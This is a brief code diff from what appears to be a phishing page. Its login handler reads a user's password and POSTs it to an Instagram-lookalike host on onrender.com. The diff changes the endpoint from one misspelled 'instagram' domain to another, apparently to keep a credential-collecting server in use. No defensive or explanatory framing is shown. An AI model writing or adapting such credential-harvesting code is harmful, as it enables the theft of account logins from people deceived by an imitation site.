@@ -20,7 +20,7 @@
       const password = document.getElementById('password').value.trim();
 
       try {
-        const response = await fetch('https://instagram-w6tb.onrender.com/login', {
+        const response = await fetch('https://instagr-qnih.onrender.com', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json'
